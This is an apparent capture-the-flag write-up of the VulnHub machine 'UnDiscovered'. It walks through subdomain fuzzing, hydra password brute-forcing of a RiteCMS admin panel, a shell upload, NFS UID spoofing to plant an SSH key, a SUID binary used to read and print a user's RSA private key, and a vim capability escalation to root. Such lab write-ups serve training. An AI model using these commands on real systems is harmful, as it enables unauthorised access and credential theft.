---
title: Vulnhub - UnDiscovered
description: My writeup on UnDiscovered box.
categories:
 - vulnhub
tags: vulnhub nfs hydra wfuzz ritecms capabilities ssh
---

![](https://i.imgur.com/mmvSbqs.png)

You can find the machine there > [UnDiscovered](https://www.vulnhub.com/entry/undiscovered-101,550/){:target="_blank"}

## Summary

This was one of the best vulnhub box, thanks to [@aniqfakhrul](https://twitter.com/aniqfakhrul){:target="_blank"} & [@h0j3n](https://twitter.com/h0j3n){:target="_blank"} for this awesome box! We start by enumerating subdomains and bruteforcing RiteCMS this gives us shell as www-data. Then we exploit NFS to get shell as william, after we use a SUID binary to get access a leonard and finally privesc is about capabilities! Let’s pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.5                                     
$ nmap -p- -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-30 21:10 EEST
Nmap scan report for undiscovered.zte.com.cn (192.168.1.5)
Host is up (0.00036s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp    open  http     Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://undiscovered.thm
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      34047/tcp6  nlockmgr
|   100021  1,3,4      44886/tcp   nlockmgr
|   100021  1,3,4      51937/udp   nlockmgr
|   100021  1,3,4      55740/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
44886/tcp open  nlockmgr 1-4 (RPC #100021)
```

Lot of interesting stuff, let's enumerate port 80 first. When we visit port 80 doens't load, nmap scan says something important `Did not follow redirect to http://undiscovered.thm` probably a virtual host we have to add it to `/etc/hosts`:

```
$ echo "192.168.1.5 undiscovered.thm" | tee -a /etc/hosts
192.168.1.5 undiscovered.thm
$ cat /etc/hosts
..data..
192.168.1.5 undiscovered.thm
```

Now it works, i tried lot of stuff like `gobuster`,`dirb` but nothing at all. Since we have a virtual host we can enumerate for subdomains. Let's fire up `wfuzz`:

```
$ wfuzz -w /root/Documents/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt -H "Host: FUZZ.undiscovered.thm" --hw 26 undiscovered.thm

000000096:   200        68 L     341 W    4626 Ch     "dashboard"                                                                                                             
000000102:   200        83 L     341 W    4599 Ch     "booking"                                                                                                               
000000129:   200        68 L     341 W    4521 Ch     "play"                                                                                                                  
000000156:   200        68 L     341 W    4626 Ch     "resources"                                                                                                             
000000218:   200        68 L     341 W    4542 Ch     "forms"                                                                                                                 
000000257:   200        68 L     341 W    4542 Ch     "start"                                                                                                                 
000000553:   200        68 L     341 W    4584 Ch     "manager"                                                                                                               
000000681:   200        68 L     341 W    4584 Ch     "network"                                                                                                               
000000733:   200        68 L     341 W    4605 Ch     "internet"                                                                                                              
000000889:   200        68 L     341 W    4521 Ch     "view"                                                                                                                  
000001245:   200        68 L     341 W    4521 Ch     "gold"                                                                                                                  
000001305:   200        68 L     341 W    4668 Ch     "maintenance"                                                                                                           
000005963:   200        68 L     341 W    4605 Ch     "terminal"                                                                                                              
000006033:   200        68 L     341 W    4584 Ch     "newsite"                                                                                                               
000007423:   200        68 L     341 W    4584 Ch     "develop"                                                                                                               
000022957:   200        68 L     341 W    4605 Ch     "mailgate"                                                                                                              
000034373:   200        82 L     341 W    4650 Ch     "deliver" 
```

Lot subdomains, all of them run `RiteCMS` but most of them seem broken admin panel missing. One of them works thats `deliver.undiscovered.thm` let's add it to `/etc/hosts`:

```
$ echo "192.168.1.5 deliver.undiscovered.thm" | tee -a /etc/hosts
192.168.1.5 deliver.undiscovered.thm
$ cat /etc/hosts 
..data..
192.168.1.5 undiscovered.thm
192.168.1.5 deliver.undiscovered.thm
```

## Shell as www-data

Now we can see the admin panel under `/cms`:

![](https://i.imgur.com/FINKQFM.png)

Let's search for possible exploits on RiteCMS:

```
$ searchsploit -w ritecms
-----------------------------------------------------------------------------------------------------------------
 Exploit Title                                                       |  URL
-----------------------------------------------------------------------------------------------------------------
RiteCMS 1.0.0 - Multiple Vulnerabilities                             | https://www.exploit-db.com/exploits/27315
RiteCMS 2.2.1 - Authenticated Remote Code Execution                  | https://www.exploit-db.com/exploits/48636
-----------------------------------------------------------------------------------------------------------------
```

Second one seems perfect, but we need creds. Tried default username/password `admin:admin` but didn't work. Let's fire up hydra!

```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=admin&userpw=^PASS^:User unknown or password wrong"

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=admin&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
```

& we're in as `admin:liverpool` follow my steps for shell upload:

![](https://i.imgur.com/OJnp4pH.png)

![](https://i.imgur.com/w5qgPOD.png)

![](https://i.imgur.com/xlopYfo.png)

![](https://i.imgur.com/leifpNg.png)

```
$ nc -lvp 5555
listening on [any] 5555 ...

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@undiscovered:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as william

I enumerated a lot but nothing, then i turned back to nmap scan and bingo i missed NFS! NFS(Network File System) allows a system to share files & directories with others in a network. 

If we try to identify the shared directory, we can see that isn't registered:

```
$ showmount -e 192.168.1.5
clnt_create: RPC: Program not registered
```

We have to find it manually, this requires some NFS experience. We have to check `/etc/exports`:

```
www-data@undiscovered:/$ cat /etc/exports
..data..

/home/william	*(rw,root_squash)
```

Perfect, let's mount it now:

```
$ mkdir nfs
$ mount 192.168.1.5:/home/william nfs
```

If we try to access it we get `permission denied`:

```
$ cd nfs
cd: permission denied: nfs
```

Here we have to do a trick to bypass that, we can create a user with the same UID as william on our system.

```
www-data@undiscovered:/$ id william
uid=3003(william) gid=3003(william) groups=3003(william)
```

```
$ useradd pwner
$ usermod -u 3003 pwner
$ su - pwner
$ cd nfs
$ ls -la
total 44
drwxr-x--- 4 nobody 4294967294 4096 Sep  9 17:13 .
drwxr-xr-x 4 root   root       4096 Sep 30 22:04 ..
-rwxr-xr-x 1 nobody 4294967294  128 Sep  4 16:43 admin.sh
-rw------- 1 nobody 4294967294    0 Sep  9 16:46 .bash_history
-rw-r--r-- 1 nobody 4294967294 3771 Sep  4 17:16 .bashrc
drwx------ 2 nobody 4294967294 4096 Sep  4 13:33 .cache
drwxrwxr-x 2 nobody 4294967294 4096 Sep  4 16:49 .nano
-rw-r--r-- 1 nobody 4294967294   43 Sep  4 17:19 .profile
-rwsrwsr-x 1 nobody 4294967294 8776 Sep  4 17:11 script
-rw-r----- 1 nobody 4294967294   39 Sep  9 17:13 user.txt
```

Perfect!! Now we can add our public key at `.ssh/authorized_keys`.

```
$ ssh-keygen -t rsa
Generating public/private rsa key pair.

Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:HEZFJoznGtXni0+9uzy9aunDC/4lMb6kNXHshB3E7V4 root@0xatomlab
The key's randomart image is:
+---[RSA 3072]----+
|       oo++   ...|
|      ..+o. . ...|
|       +o  o   o |
|      .o..  . + E|
|       oS  . B *.|
|      .   . + O .|
|           +.*.= |
|          . **B .|
|           o+*B=.|
+----[SHA256]-----+
```

```
$ mkdir .ssh
$ cd .ssh
$ touch authorized_keys
$ nano authorized_keys
...
$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkIemIDT2dpkzr8djT9UP/N3TVtcstLy8ZPt06DIUivHgU0psaMoU/4zcfneT1oI65ltAZ7z4wz9kwk94L4LrgvcsifqFBEQ37XN5Mw5jczXgpYaSZOwhMOy4W3BFknOtUHckL2yX52lFltqwiRj50Nyh23A70HoUcCeqxCXbNrcV53qxPrF4fn6wNeCZpkI4bPdSVkNTWA53+y9Txwhn3ypA25LoGCJGWrM+hSBEEW7WLBUioBulReWBieGNrYvWQV4DgNqFsTr1IJie8P07pMHVwWu4hiP/zAvGfn46W5MgycQpF19dWQH6nmIQAcnm1qQmusq646NLhFkKHNhsOy1w6xIeezKJTElu8z7QYeN+0fVSF1AwrPZiSBjI9piWRTp1+r9LW1qxvmYv/jGimYC3CF88815tiIEZSsJdZatB9PD7k3/ZODK+yuACxybVMZFJLnKMAV1Q3s76WOl/IFtQXLtpStiQtAiqv5qE/idC3gGG7SLWYLqLXdlFoR4c= root@0xatomlab
```

Now let's login in:

```
$ ssh -i id_rsa william@192.168.1.5

william@undiscovered:~$ whoami;id
william
uid=3003(william) gid=3003(william) groups=3003(william)
```

## Shell as leonard

In william's directory we can see a SUID file that reads `admin.sh`:

```
william@undiscovered:~$ ls -la script
-rwsrwsr-x 1 leonard leonard 8776 Sep  4 22:11 script
william@undiscovered:~$ ./script
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
william@undiscovered:~$ cat admin.sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
```

If we run `strings` on it we can see that runs `/bin/cat` under `/home/leonard/`:

```
william@undiscovered:~$ strings script
/lib64/ld-linux-x86-64.so.2
n2JP
libc.so.6
setreuid
__stack_chk_fail
strcat
system
__libc_start_main
__gmon_start__
GLIBC_2.2.5
GLIBC_2.4
UH-P
/bin/catH
 /home/lH
eonard/
```

So we can simply read leonard's SSH private key!

```
william@undiscovered:~$ ./script .ssh/id_rsa | tee key ; chmod 600 key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
william@undiscovered:~$ ssh -i key leonard@localhost

leonard@undiscovered:~$ whoami;id
leonard
uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
```

## Shell as root

Now the final privilege escalation, it's about `capabilities`. Let's scan the file system for files with capabilities using `getcap`:

```
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```

Awesome we can exploit vim, [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#capabilities){:target="_blank"} provide us the answer:

```
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
# whoami;id
root
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
```

Let's read the flags:

![](https://i.imgur.com/LV2dkr0.png)

Whoa! Crazy box! :fire:
